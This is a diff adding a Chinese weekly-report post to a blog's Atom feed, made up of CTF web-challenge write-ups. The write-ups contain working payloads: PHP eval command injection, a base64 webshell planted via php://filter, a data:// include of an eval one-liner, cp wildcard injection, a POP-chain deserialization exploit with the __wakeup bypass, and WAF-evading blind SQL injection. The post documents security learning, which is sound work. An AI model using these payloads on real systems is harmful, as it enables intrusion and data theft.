@@ -3,11 +3,165 @@
   <id>https://kitty-xm.github.io/</id>
   <title type="text">kitty&apos;s blog</title>
   <subtitle type="text">喵喵喵</subtitle>
-  <updated>2026-10-25T00:00:00.000Z</updated>
+  <updated>2026-10-31T00:00:00.000Z</updated>
   <author><name>kitty</name></author>
   <link rel="alternate" href="https://kitty-xm.github.io/"/>
   <link rel="self" href="https://kitty-xm.github.io/atom.xml"/>
   <generator uri="https://github.com/CuteLeaf/Firefly">Firefly v6.16.8</generator>
+    <entry>
+      <id>https://kitty-xm.github.io/posts/%E5%91%A8%E6%8A%A52/</id>
+      <title type="text">周报2</title>
+      <published>2026-10-31T00:00:00.000Z</published>
+      <updated>2026-10-31T00:00:00.000Z</updated>
+      <author><name>kitty</name></author>
+      <link rel="alternate" href="https://kitty-xm.github.io/posts/%E5%91%A8%E6%8A%A52/"/>
+      <summary type="text"></summary>
+      <content type="html"><![CDATA[<section><h1>概述<a href="#概述"><span>#</span></a></h1><p>这周开始再打极客的比赛题，后来极客的Web一直不更新题库就又去ctf.show打WEB入门了，这周主要是在打php、命令执行这方面。总体来说学会了理解比较简单的php代码和一点代码审计以及比较常见的绕过过滤。</p></section>
+<section><h1>WP<a href="#wp"><span>#</span></a></h1><ul>
+<li><strong>Web 29</strong>(ctf.show WEB入门)
+好，先是这道题。
+<figure><img alt="&gt;.&lt;" loading="lazy" width="427" height="235" src="/_astro/e3.C4fvH6OA_Z1p29m7.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+</ul><ol>
+<li>有两行看不懂(大概能知道过滤了什么，但具体的每行每个字符不知道意思)，查一下。
+<figure><img alt="&gt;.&lt;" loading="lazy" width="961" height="805" src="/_astro/e4.DKiMNcU8_tbpSK.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+大致意思是让我们用GET方式传一个参数c，且这个c的内容里flag这个字符串被过滤了，不论大小写，然后就是这个eval函数会直接执行参数c里的内容，只要满足绕过flag这个字符串基本就能出flag。
+<strong>注</strong>：eval内执行的是php代码，必须以分号结尾。</li>
+<li>先查一下目录看看flag文件名。（加/?c=system(ls);）
+<figure><img alt="&gt;.&lt;" loading="lazy" width="1135" height="181" src="/_astro/e5.DaYkMMMV_Z1biYOB.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+<li>文件名为flag.php，去读取它（/?c=system(“tac fla*.php”);）
+<figure><img alt="&gt;.&lt;" loading="lazy" width="1324" height="237" src="/_astro/image1.KHYVlEmV_Z1JSXbF.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+出来了。
+<strong>另：题目WP里还有一些别的解法：</strong>
+<figure><img alt="&gt;.&lt;" loading="lazy" width="1075" height="1170" src="/_astro/image.DhtM5kQE_Z177YHV.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+</ol><ul>
+<li><strong>玉米厨房</strong>
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2554" height="1533" src="/_astro/image2.CFKtTbgG_Z1LVI0J.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+</ul><ol>
+<li>来，这道题。图中明示使用GET方式以及name为cornguard
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2529" height="1459" src="/_astro/e6.Bxj4tv9k_1PoS.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+<li>如图示POST传入action=join
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2542" height="1477" src="/_astro/image3.gML2YIKU_yVdAH.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+<li>近乎明示改UA
+<strong>注</strong>：这里的请求必须用GET方式！否则会返回405。
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2556" height="1477" src="/_astro/image4.DjaUWOu-_2odDMK.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+<li>按F12打开开发者模式在Network里面找到game.js查看response源代码文件，可以在里面找到这个
+<figure><img alt="&gt;.&lt;" loading="lazy" width="591" height="408" src="/_astro/e7.BG0h80on_SYVh3.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+<li>然后可以在控制台里面改damage为9999,保证第三波怪可以被清死。</li>
+<li>接着就是点击再次接管再回车控制台里面的内容就可以了。
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2557" height="1462" src="/_astro/e8.8QIBp7Mj_1jWsN3.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+</ol><ul>
+<li><strong>ezphp</strong>
+<figure><img alt="&gt;.&lt;" loading="lazy" width="532" height="886" src="/_astro/e9.mfFKqcc1_eVnpu.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+题目中有个这个</li>
+</ul><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>}</span></div></div><div><div><div>2</div></div><div>
+</div></div><div><div><div>3</div></div><div><span>if (intval($num, 0) === 411413) {</span></div></div><div><div><div>4</div></div><div><span><span>    </span></span><span>$_SESSION[</span><span>'ezphp_level1'</span><span>] = true</span><span>;</span></div></div><div><div><div>5</div></div><div><span><span>    </span></span><span>header(</span><span>"Location: death.php"</span><span>)</span><span>;</span></div></div><div><div><div>6</div></div><div><span><span>    </span></span><span>exit</span><span>;</span></div></div><div><div><div>7</div></div><div><span>}</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>结合去前面的可以得出题目限制：</p><ol>
+<li>必须是字符串</li>
+<li>不能 == 411413（松散不等）</li>
+<li>不能有字母、点、反斜杠</li>
+<li>必须含 “0”，且strpos不能返回0或false</li>
+<li>intval($num,0) === 411413要求八进制解析
+<strong>注</strong>：这里如果直接写 01443425，第一个字符就是 0，strpos返回 0，代码里 !0 在 PHP 里等于 true，直接 die，回显”玉米说以防万一再试试这个”</li>
+<li>用计算机转换411413为八进制得1443425，要PHP认出是八进制需要在这段数字前面加一个0，这是进制标签。另外因为代码不允许没有零且零不能在0号位置，另外因为代码不允许没有<code>0</code>且<code>0</code>不能在0号位置，然而strpos 是老老实实按原始字符串逐个数位置的，所以说要找个为了不影响解析在前面加个空格，因为空格也是一个正经字符，占一个位置。加了空格之后，原来的 <code>0</code> 就被挤到位置 1 去了，返回值从 <code>0</code> 变成 <code>1</code>，<code>!1</code> 是 <code>false</code>，检查就放过了。</li>
+<li>于是尝试在URL后面加/?num=%2001443425进入death.php界面。在该界面按F12打开开发者模式到应用里找到Cookies,展开找到该网址，其右侧Name下有个PHPSESSID，复制其对应的Value待会用。（我这里SESSID为d7b4688ec35905908641821deb57ac79）
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2554" height="1527" src="/_astro/image5.DlkX9D5z_Z1g0bUi.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+<li>接下来打开powershell用curl写一句话木马：
+curl.exe “<a href="http://80-ba070d89-59b2-4cfd-b6d9-ddf7369ec478.challenge.ctfplus.cn/death.php?filename=php://filter/convert.base64-decode/resource=shell.php" target="_blank">http://80-ba070d89-59b2-4cfd-b6d9-ddf7369ec478.challenge.ctfplus.cn/death.php?filename=php://filter/convert.base64-decode/resource=shell.php</a>” -H “Cookie: PHPSESSID=d7b4688ec35905908641821deb57ac79” —data-urlencode “content=aPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==”</li>
+</ol><p>因为有：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>if (empty($_SESSION[</span><span>'ezphp_level1'</span><span>])) {</span></div></div><div><div><div>2</div></div><div><span><span>    </span></span><span>http_response_code(404)</span><span>;</span></div></div><div><div><div>3</div></div><div><span><span>    </span></span><span>exit(</span><span>"not found"</span><span>)</span><span>;</span></div></div><div><div><div>4</div></div><div><span>}</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p><strong>注</strong>：PHP 的 session 靠请求头里的 <code>Cookie: PHPSESSID=xxx</code> 把请求和第一关的会话文件绑定起来。curl 默认不带浏览器的cookie，所以必须用 <code>-H</code> 手动塞一个请求头进去；不带的话服务器认不出你过了第一关，直接返回 <code>not found</code>。</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>$</span><span>content</span><span><span> </span><span>=</span><span> $_POST[</span></span><span>'content'</span><span>]</span><span>;</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>这个说明POST参数需要来自请求体，而不是在 URL 里，所以要在curl 里用 <code>--data-urlencode</code>来表示 “用 POST 方式发数据到 body”。</p><p>因为有这个：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>&lt;?php exit</span><span>;?&gt;  +  content</span></div></div></code></pre><div><div></div><div></div></div></figure></div><ol>
+<li>前面 <code>&lt;?php exit;?&gt;</code> 经过 base64 解码时，有效字母只剩 <code>phpexit</code> 共 <strong>7 个</strong>字符；base64 是 4 个字符解一组，7 mod 4 = 3，差 1 个凑齐一组。所以在 content 开头补一个 a，让前面变成 <code>phpexita</code> 共 8 个字符（两组），完整解成一堆垃圾字节；后面真正的木马 base64 就能从新一组的开头整齐解码，不会错位。加上php://filter的伪协议，这样<code>file_put_contents($filename, $content)</code> 收到 <code>php://filter/.../resource=shell.php</code> 时，就不会把它当普通文件名，而是先把 <code>$content</code> 整体 base64 解码，再写入 <code>shell.php</code>，就可以绕过前缀了。
+返回<code>xiexie吞了吞口水，他好像知道自己失败了</code>就是写入成功了。</li>
+<li>然后就是验证木马活性，成功之后查目录文件，发现有flag.php，读取它就拿到flag了。
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2559" height="1324" src="/_astro/image-1.CcfnhlfL_Z1Bdhuw.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+</ol><ul>
+<li><strong>术之尽头</strong>
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2559" height="1527" src="/_astro/e0.DZW7Wfx4_3h3cc.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+</ul><ol>
+<li>打开题目映入眼帘的只有四张漫画图片，其余啥也没有了。那就打开源码看一下，结果发现还是干净得只有图片。</li>
+<li>返回题目页面扫一下常见路径发现只有robots.txt返回200，读robots.txt出来个这个
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2088" height="1102" src="/_astro/e10.Dqh7kH0C_1bRP7y.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+图中是flllaaag.php，和正常flag不一样，并且在wsl的回显里发现引用了一个 <code>/assets/robots.min.js</code>，反正不知道干嘛，先去看看js文件。
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2356" height="222" src="/_astro/e11.BwodgIBm_1keVlc.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+一串乱东西，问了AI发现有js混淆，说每个字节跟一个密钥 <code>k</code> 做异或，要进行两次异或还原
+<figure><img alt="&gt;.&lt;" loading="lazy" width="1120" height="283" src="/_astro/e12.C4HYMfUV_CUBae.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+<li>得到一个路径/truueechallenge.php，也是拼错了的，但先不管，加上这个路径看看
+<figure><img alt="&gt;.&lt;" loading="lazy" width="1240" height="613" src="/_astro/e13.CpXy4jYS_29qrxv.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+出现了一段php代码和一句提示，需要把php源码中的一句话木马包含进执行流。
+在源码中有：</li>
+</ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>base64_decode(substr($file, 25), true) !== $cmd</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p><code>substr($file, 25)</code> = 取 file 参数<strong>从第 26 个字符开始</strong>（前 25 个字符被切掉不要）且从第 26 个字符开始：必须是 <code>&lt;?php @eval($_POST['cmd']); ?&gt;</code> 的 base64。</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>include $file;</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>这 25 个字符必须是PHP能认的包装器
+<strong>区分</strong>：</p><ul>
+<li><code>http://</code>、<code>https://</code> —— 包含远程 URL（很多环境关了）。</li>
+<li><code>php://input</code> —— 读原始 POST body。</li>
+<li><strong><code>data://</code></strong> —— 直接在 URL 里内嵌数据，格式：</li>
+</ul><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>data://MIME类型</span><span>;base64,BASE64编码的内容</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>PHP 会把逗号后面的 base64 解码，当作文件内容包含进来。
+所以选用data://伪协议
+木马经base64编码为PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+
+所以可以得到file参数为data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+
+4. 接下来发请求，先查目录，
+</p><figure><img alt="&gt;.&lt;" loading="lazy" width="1714" height="688" src="/_astro/e14.Zsgmbcv5_LBDWv.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+5. 然后找flag，但是没权限读不了。发现有个非标准根目录里的文件start.sh，读一下。
+发现是一个以 root 身份跑的后台死循环，且<code>/var/www/html/primary</code> 权限是 777，于是就可以 www-data 随便写文件、随便建符号链接。
+但是符号链接失败了，原因是<code>cp -P</code> 里的 <code>-P</code> 是 GNU cp 的 <code>--no-dereference</code>（不跟随符号链接）选项。它把 “符号链接本身” 复制过去了，没读目标文件内容。然后 <code>chmod 755 -R</code> 默认也不跟随符号链接，所以 <code>/tmp/flag</code> 的权限根本没被改。
+6. 于是尝试通配符注入（*），循环命令为：<p></p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>cp -P * /var/www/html/marstream/</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>在 primary 目录里放一个<strong>名字叫 <code>-L</code> 的空文件</strong>，于是 <code>*</code> 展开后命令变成：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>cp -P -L x /var/www/html/marstream/</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>输入构造的完整payload后回显就是flag。</p><ul>
+<li><strong>ez_pop</strong>
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2536" height="1359" src="/_astro/e15.CTwA5_aW_Z287sXh.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2544" height="1347" src="/_astro/e16.DnwVSeND_Z2w1eWD.webp" /><figcaption>&gt;.&lt;</figcaption></figure>
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2539" height="460" src="/_astro/e17.D7BPF6Mv_Z2w8sHz.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+</ul><ol>
+<li>先看源码
+在<code>filter()</code>：<code>str_replace("admin","hacker",$data)</code>可以看出<strong>admin 是 5 个字符，hacker 是 6 个字符</strong>—— 替换后字符串变长了 1 个字符，但序列化格式里声明的字符串长度（<code>s:数字:"内容"</code>）还是原来的数字。长度对不上了，所以就能做 “字符逃逸”。</li>
+<li>然后是找POP链
+根据源码里出现的魔术方法先一个一个调，最后把六种方法整合起来就得到完整链条。</li>
+</ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>A::__destruct → echo sign</span></div></div><div><div><div>2</div></div><div><span><span>  </span></span><span>→ B::__toString → $action()</span></div></div><div><div><div>3</div></div><div><span><span>    </span></span><span>→ C::__invoke → target-&gt;aaa()</span></div></div><div><div><div>4</div></div><div><span><span>      </span></span><span>→ D::__call → next-&gt;aaa()</span></div></div><div><div><div>5</div></div><div><span><span>        </span></span><span>→ E::__get → sink-&gt;</span><span>flag_trigger</span><span><span> </span><span>=</span><span> cmd</span></span></div></div><div><div><div>6</div></div><div><span><span>          </span></span><span>→ F::__set → system(</span><span>"cat /flag"</span><span>)</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>大概长这样。
+所以链子就是：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>A::__destruct → B::__toString → C::__invoke → D::__call → E::__get → F::__set → system()</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>最终让 <code>system("cat /flag")</code> 执行。
+但是呢，有：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>function __wakeup() {</span></div></div><div><div><div>2</div></div><div><span><span>    </span></span><span>$this-&gt;</span><span>action</span><span><span> </span><span>=</span><span> null</span></span><span>;</span></div></div><div><div><div>3</div></div><div><span>}</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>所以B::__wakeup 会清空 action。
+<strong>注</strong>：这是 CVE-2016-7124。B 实际只有 1 个属性 <code>action</code>，但序列化里把<strong>属性个数写成 2</strong>（<code>O:1:"B":2:{...}</code>），PHP 就不执行 <code>__wakeup</code> 了。
+另外，因为unserialize 读的是 A 对象的序列化串，sign 原本是字符串。所以要让解析器把 sign 读成对象，就需要用字符逃逸。
+在 <code>user</code> 参数里放 N 个 <code>admin</code>，过滤后每个都多长 1 个字符，总共多出 N 个字符。这 N 个字符会超出user字符串末尾的引号，把后面 <code>;s:4:"sign";s:长度:"</code> 这段声明覆盖掉。这样预先拼在 user 末尾的 <code>";s:4:"sign";O:1:"B":2:{...}</code> 就会被顺势解析成 A 的第二个属性 ，也就是sign会直接变成 B 对象。
+3. 接下来构造payload，先拼POP链序列化串：</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>$</span><span>cmd</span><span><span> </span><span>=</span><span> </span></span><span>'cat /flag'</span><span>;</span></div></div><div><div><div>2</div></div><div><span>$</span><span>f</span><span><span> </span><span>=</span><span> </span></span><span>'O:1:"F":0:{}'</span><span>;</span></div></div><div><div><div>3</div></div><div><span>$</span><span>e</span><span><span> </span><span>=</span><span> </span></span><span>'O:1:"E":2:{s:4:"sink";'</span><span>.$f.</span><span>'s:3:"cmd";s:9:"cat /flag";}'</span><span>;</span></div></div><div><div><div>4</div></div><div><span>$</span><span>d</span><span><span> </span><span>=</span><span> </span></span><span>'O:1:"D":2:{s:4:"next";'</span><span>.$e.</span><span>'s:8:"property";s:3:"aaa";}'</span><span>;</span></div></div><div><div><div>5</div></div><div><span>$</span><span>c</span><span><span> </span><span>=</span><span> </span></span><span>'O:1:"C":2:{s:6:"target";'</span><span>.$d.</span><span>'s:6:"method";s:3:"aaa";}'</span><span>;</span></div></div><div><div><div>6</div></div><div><span>$</span><span>b</span><span><span> </span><span>=</span><span> </span></span><span>'O:1:"B":2:{s:6:"action";'</span><span>.$c.</span><span>'}'</span><span>;</span></div></div></code></pre><div><div></div><div></div></div></figure></div><ol>
+<li>然后算逃逸量：</li>
+</ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>$</span><span>pad</span><span><span> </span><span>=</span><span> </span></span><span>'";s:4:"sign";'</span><span> . $b . </span><span>'}'</span><span>;</span></div></div><div><div><div>2</div></div><div><span>$</span><span>N</span><span><span> </span><span>=</span><span> strlen($pad)</span></span><span>;</span></div></div><div><div><div>3</div></div><div><span>$</span><span>u</span><span><span> </span><span>=</span><span> str_repeat(</span></span><span>'admin'</span><span>, $N) . $pad</span><span>;</span></div></div><div><div><div>4</div></div><div><span>$</span><span>s</span><span><span> </span><span>=</span><span> </span></span><span>'a'</span><span>;</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p><strong>注</strong>：这里N 必须正好等于 PAD 长度，否则会解析错位。
+5. 最后就是发请求，打开Powershell把 <code>user</code> 做 URL 编码后拼成请求发出去。</p><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>$</span><span>u</span><span><span> </span><span>=</span><span> wsl php /mnt/c/Users/1/gen_payload.php</span></span></div></div><div><div><div>2</div></div><div><span>$</span><span>url</span><span><span> </span><span>=</span><span> </span></span><span>"http://80-20b8eb23-...challenge.ctfplus.cn/?user=$u&amp;sign=a"</span></div></div><div><div><div>3</div></div><div><span>Invoke-WebRequest -Uri $url -UseBasicParsing</span></div></div></code></pre><div><div></div><div></div></div></figure></div><ol>
+<li>响应里按顺序打出链上每一步的提示语（”？！强强？！""666，还有第二关 ""马上就到了"" 还有一步 ”），所以继续：</li>
+</ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>RCE:</span></div></div><div><div><div>2</div></div><div><span>SYC{c04d6dc6-3739-4166-bfac-0087c91ee48c}</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>这样就拿到了。</p><ul>
+<li><strong>丹特丽安の書架</strong>
+<figure><img alt="&gt;.&lt;" loading="lazy" width="2559" height="1528" src="/_astro/e18.Ce6j6sXz_1c4AHo.webp" /><figcaption>&gt;.&lt;</figcaption></figure></li>
+</ul><ol>
+<li>页面和源码里都没什么东西，就5本书和书的内容简介。
+看到检索栏，条件反射SQL注入布尔盲注，先试试吧。</li>
+<li>先找注入点，示例说输入1，回显说“该书存在于书架之上”，那有5本书应该1~5都正常，输入6，发现6也回显存在，输入7则是“未查询到本书相关信息”，那注入点多半是6了。
+测试AND这些发现都没过滤，但AND’1’=‘1能回显存在，AND’1’=‘2不行，所以应该是单引号字符型注入：后端 SQL 形如 SELECT … FROM security WHERE id=‘&lt;输入&gt;‘，输入里的 ’ 可以闭合字符串。但是用---注释后段拼接不行，被过滤了，所以用#
+<strong>绕过规则</strong> 裸写关键字会被 WAF 替换/删除导致 SQL 语法错误（返回 MISS）。MySQL 版本注释 /<em>!50000关键字</em>/ 在版本 ≥ 5.00.00 时会被当作正常 SQL 执行，而普通 WAF 往往只匹配裸关键字，从而绕过。
+| 	词 |	裸写	 | 绕过写法 |
+| 连接/子句关键字 | and	| ✗ 被删  | /<em>!50000and</em>/ |
+|       | select |	✗	 | /<em>!50000select</em>/ |
+|       | from |	✗	| /<em>!50000from</em>/ |
+|       | where |	✗	| /<em>!50000where</em>/ |
+|       | limit |	✗	 | /<em>!50000limit</em>/ |
+|       | between / in / order / by / having |	✗	 | /<em>!50000词</em>/ |
+| 函数（不过滤） | substr / mid / ascii / length / count / database() / version()  | 	✓ 直接写 |	无需包裹 |
+| 其他	| like / exists	 | ✓ 直接写	| 无需包裹 |
+| 运算符 |	= &gt; &lt; 逗号 , 括号 () |	✓ |	直接写 |
+注意：函数名一旦用 /<em>!50000substr</em>/ 包裹反而失效（WAF 对注释内内容也做了二次处理），所以只包裹被过滤的 SQL 关键字，函数保持裸写。
+通用请求骨架：</li>
+</ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>?</span><span>id</span><span><span>=</span><span>1</span></span><span>'/*!50000and*/&lt;布尔表达式&gt;#</span></div></div></code></pre><div><div></div><div></div></div></figure></div><ol>
+<li>先查数据库：</li>
+</ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>1</span><span>'/*!50000and*/length((/*!50000select*/database()))&gt;0#</span></div></div><div><div><div>2</div></div><div><span>1'</span><span>/*!50000and*/ascii(substr((/*!50000select*/database()),1,1))&gt;...</span><span>#</span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>结果：<code>syclover</code></p><ol>
+<li>再查表名：</li>
+</ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>(/*!50000select*/count(*)/*!50000from*/information_schema.tables</span></div></div><div><div><div>2</div></div><div><span><span> </span></span><span>/*!50000where*/ </span><span>table_schema</span><span><span>=</span><span>database())</span></span></div></div></code></pre><div><div></div><div></div></div></figure></div><p>当前库只有 1 张表：security（其余 87 张均为 information_schema / performance_schema 系统表）。</p><ol>
+<li>再查列名：</li>
+</ol><div><figure><figcaption></figcaption><pre><code><div><div><div>1</div></div><div><span>(/*!50000select*/column_name/*!50000from*/information_schema.columns</span></div></div><div><div><div>2</div></div><div><span><span> </span></span><span>/*!50000where*/ table_schema=database() /*!50000and*/ table_name='security')</span></div></div></code></pre><div><div></div><div></div></div></figure></div><ol>
+<li>读数据：
+| 行 |	syc_flag |
+| 0 |	syc1 |
+| 1	| syc2 |
+| 2	| syc3 |
+| 3	| syc4 |
+| 4	| syc5 |
+| 5	| SYC{45fd0cda-e7b6-465f-97c2-012f726feaf3} |
+取值子查询：
+<code>(/*!50000select*/syc_flag/*!50000from*/security /*!50000limit*/ 5,1)</code>
+然后就有了。</li>
+</ol></section>]]></content>
+    </entry>
     <entry>
       <id>https://kitty-xm.github.io/posts/%E5%91%A8%E6%8A%A51/</id>
       <title type="text">周报1</title>
